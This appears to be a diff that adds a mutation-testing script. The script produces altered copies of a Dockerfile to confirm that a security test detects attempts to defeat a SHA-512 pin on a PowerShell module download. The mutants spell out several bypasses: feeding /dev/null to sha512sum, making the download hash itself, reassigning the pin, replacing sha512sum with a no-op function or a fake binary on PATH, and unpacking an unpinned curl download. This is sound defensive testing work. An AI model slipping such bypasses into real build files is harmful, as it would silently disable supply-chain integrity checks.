@@ -1,0 +1,72 @@
+"""security-u1-r2: re-run of security-u1-r1's static mutants (S-set) against the rework-2
+PSC-10 test, plus regression (good-feed) cases and one extra feed-tampering mutant (S8).
+Scratch copies of docker/gates.Dockerfile only; the repo file is never written. Patches
+GATES_DOCKERFILE in tests.test_gates_docker_cli and tests.test_gate_least_privilege.
+Change from r1: S2 now writes a literal backslash-n into the Dockerfile ('\n'); the r1
+driver wrote a real newline (non-raw f-string), which broke the RUN, so its S2 KILLED was
+an artefact. The r1 form is kept as S2-r1 to show that."""
+import io, sys, unittest
+from pathlib import Path
+REPO = Path(r"C:\repos\Knowledge-engine")
+OUT = Path(sys.argv[1]); OUT.mkdir(parents=True, exist_ok=True)
+sys.path.insert(0, str(REPO))
+import tests.test_gates_docker_cli as cli
+import tests.test_gate_least_privilege as glp
+src = (REPO / "docker" / "gates.Dockerfile").read_text(encoding="utf-8")
+def rep(t, old, new):
+    assert old in t, old
+    return t.replace(old, new, 1)
+E = "cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e"  # sha512 of empty input
+C = 'echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sha512sum -c -;'
+BS = chr(92); LN = BS + "n"  # literal backslash-n / line continuation, built without escapes
+IMPORT = '    pwsh -NoProfile -NonInteractive -Command "Import-Module PSScriptAnalyzer -ErrorAction Stop"\n'
+good = {
+  "G0 control (repo file unchanged)": src,
+  "G1 printf '%s  %s<LN>' pin path": rep(src, C, "printf '%s  %s" + LN + "' \"$PSSCRIPTANALYZER_SHA512\" /tmp/psa.nupkg | sha512sum -c -;"),
+  "G2 printf <dq>%s  %s<LN><dq> pin path (double quotes)": rep(src, C, 'printf "%s  %s' + LN + '" "$PSSCRIPTANALYZER_SHA512" /tmp/psa.nupkg | sha512sum -c -;'),
+  "G3 printf '%s  /tmp/psa.nupkg<LN>' pin": rep(src, C, "printf '%s  /tmp/psa.nupkg" + LN + "' \"$PSSCRIPTANALYZER_SHA512\" | sha512sum -c -;"),
+  "G4 printf '%s<LN>' <dq>pin  path<dq> (tester's good case)": rep(src, C, "printf '%s" + LN + "' \"$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg\" | sha512sum -c -;"),
+  "G5 echo, sha512sum --strict -c -": rep(src, C, C.replace("sha512sum -c -", "sha512sum --strict -c -")),
+  "G6 echo, ${PSSCRIPTANALYZER_SHA512} braces": rep(src, C, C.replace("$PSSCRIPTANALYZER_SHA512", "${PSSCRIPTANALYZER_SHA512}")),
+}
+mutants = {
+  "S1 second sha512sum -c of /dev/null ends the pipeline": rep(src, C, C[:-1] + f' | echo "{E}  /dev/null" | sha512sum -c -;'),
+  "S2 printf %.0s drops the pinned line, feeds /dev/null (intended: literal <LN>)": rep(src, C, 'printf "%.0s%s' + LN + '" ' + f'"$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" "{E}  /dev/null" | sha512sum -c -;'),
+  "S2-r1 the r1 driver's S2 as written (real newline, breaks the RUN)": rep(src, C, f'printf "%.0s%s\n" "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" "{E}  /dev/null" | sha512sum -c -;'),
+  "S2b printf %.0s without newline escape": rep(src, C, f'printf "%.0s%s" "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" "{E}  /dev/null" | sha512sum -c -;'),
+  "S3 quoted command substitution self-hashes the download": rep(src, C, 'echo "${PSSCRIPTANALYZER_SHA512:+$(sha512sum /tmp/psa.nupkg | cut -c1-128)}  /tmp/psa.nupkg" | sha512sum -c -;'),
+  "S4 pin variable reassigned from the download before the check": rep(src, "    " + C, '    PSSCRIPTANALYZER_SHA512=$(sha512sum /tmp/psa.nupk? | cut -c1-128); ' + BS + '\n    ' + C),
+  "S4b pin reassigned inline, same line as the check": rep(src, C, "PSSCRIPTANALYZER_SHA512=$(sha512sum /tmp/psa.nupk? | cut -c1-128); " + C),
+  "S5 sed rewrites the feed line": rep(src, C, f'echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sed "s#.*#{E}  /dev/null#" | sha512sum -c -;'),
+  "S6 later COPY over the module dir": rep(src, IMPORT, IMPORT + '\nCOPY vendor/psa/ /usr/local/share/powershell/Modules/PSScriptAnalyzer/${PSSCRIPTANALYZER_VERSION}/\n'),
+  "S7 later RUN re-unpacks an unpinned download": rep(src, IMPORT, IMPORT + "\nRUN set -eu; curl --proto '=https' --tlsv1.2 -fsSL -o /tmp/x.zip \"https://example.invalid/x.zip\"; python3 -I -m zipfile -e /tmp/x.zip /usr/local/share/powershell/Modules/PSScriptAnalyzer/${PSSCRIPTANALYZER_VERSION}; rm /tmp/x.zip\n"),
+  "S8 parameter-expansion feed: pin and path swallowed by ${:+}, /dev/null checked": rep(src, C, f'echo "${{PSSCRIPTANALYZER_SHA512:+{E}}}  /dev/null${{PSA_UNSET:+/tmp/psa.nupkg}}" | sha512sum -c -;'),
+  "S3c quoted $(...) self-hash with python3 hashlib (killed only because _segments splits on the ; inside the quotes)": rep(src, C, 'echo "${PSSCRIPTANALYZER_SHA512:+$(python3 -I -c "import hashlib,sys;print(hashlib.sha512(open(sys.argv[1],chr(114)+chr(98)).read()).hexdigest())" /tmp/psa.nupk?)}  /tmp/psa.nupkg" | sha512sum -c -;'),
+  "S3d quoted $(cksum -a sha512 ...) self-hash (no sha512sum word, no ; in quotes)": rep(src, C, 'echo "${PSSCRIPTANALYZER_SHA512:+$(cksum -a sha512 --untagged /tmp/psa.nupk? | cut -c1-128)}  /tmp/psa.nupkg" | sha512sum -c -;'),
+  "S4c pin reassigned from python3 hashlib before the check": rep(src, C, 'PSSCRIPTANALYZER_SHA512=$(python3 -I -c "import hashlib,sys;print(hashlib.sha512(open(sys.argv[1],chr(114)+chr(98)).read()).hexdigest())" /tmp/psa.nupk?); ' + C),
+  "S4d export of the pin from python3 hashlib before the check": rep(src, C, 'export PSSCRIPTANALYZER_SHA512="$(python3 -I -c "import hashlib,sys;print(hashlib.sha512(open(sys.argv[1],chr(114)+chr(98)).read()).hexdigest())" /tmp/psa.nupk?)"; ' + C),
+  "S9 sha512sum redefined as a shell function in the RUN": rep(src, C, 'sha512sum() { cat >/dev/null; }; ' + C),
+  "S10 PATH shadow from an earlier layer (ENV PATH + COPY fake sha512sum)": rep(src, "ARG PSSCRIPTANALYZER_VERSION=", "COPY vendor/fakebin/ /opt/fakebin/" + chr(10) + "ENV PATH=/opt/fakebin:$PATH" + chr(10) + "ARG PSSCRIPTANALYZER_VERSION="),
+}
+def run(text, tag):
+    p = OUT / (tag.split()[0] + ".Dockerfile"); p.write_text(text, encoding="utf-8")
+    cli.GATES_DOCKERFILE = p; glp.GATES_DOCKERFILE = p
+    suite = unittest.TestSuite([unittest.defaultTestLoader.loadTestsFromModule(cli),
+                                unittest.defaultTestLoader.loadTestsFromModule(glp)])
+    res = unittest.TextTestResult(io.StringIO(), False, 0); suite.run(res)
+    return res.testsRun, [str(t) + " " + str(getattr(t, "_subDescription", lambda: "")()) for t, _ in res.failures + res.errors]
+print("== regression: good feeds must PASS ==")
+bad_good = 0
+for tag, text in good.items():
+    n, fails = run(text, tag)
+    if fails: bad_good += 1
+    print(f"{tag}: {'PASS' if not fails else 'FAIL'} (tests run {n}, failures {len(fails)})")
+    for f in fails: print("     " + f[:260])
+print("== mutants: must be KILLED ==")
+survived = 0
+for tag, text in mutants.items():
+    n, fails = run(text, tag)
+    if not fails: survived += 1
+    print(f"{tag}: {'KILLED' if fails else 'SURVIVED'} (tests run {n}, failures {len(fails)})")
+    for f in fails: print("     " + f[:260])
+print(f"good: {len(good)}, rejected: {bad_good}; mutants: {len(mutants)}, survived: {survived}")
